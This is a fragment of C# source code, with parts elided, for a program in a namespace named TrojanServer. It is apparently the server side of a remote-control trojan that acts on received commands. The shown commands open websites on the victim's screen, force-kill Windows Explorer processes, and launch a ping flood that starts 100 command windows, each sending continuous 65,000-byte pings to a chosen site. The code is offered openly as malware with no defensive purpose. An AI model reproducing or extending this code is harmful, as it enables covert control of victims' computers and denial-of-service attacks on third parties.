...
namespace TrojanServer
{
    class Program
    {
        ...
        public static void ForceKill(Process process)
        {
                ...
                try
                {
                    ...
                    switch (Command)
                    {
                        ...
                        case "OPENSITE":
                            ...
                            IE.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
                        ...
                        case "KILLEXPLORER":
                            Process[] ExProcesses = Process.GetProcessesByName("explorer");
                            for (int i = 0; i < ExProcesses.GetLength(0); i++)
                                ForceKill(ExProcesses[i]);
                            break;
                        ...
                        case "FLOODUSERNETWORK":
                         //Get the website URL

                         string WebSite = CommandArray[1];
                         string Cmd = "/C ping " + WebSite + " -t -l 65000";
                         //Open the site using Internet Explorer

                         for(int i = 0 ; i < 100 ; i++)
                         {
                             Process flood = new Process();
                             flood.StartInfo.FileName = "cmd";
                             flood.EnableRaisingEvents = false;
                             flood.StartInfo.Arguments = Cmd;

                            // flood.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
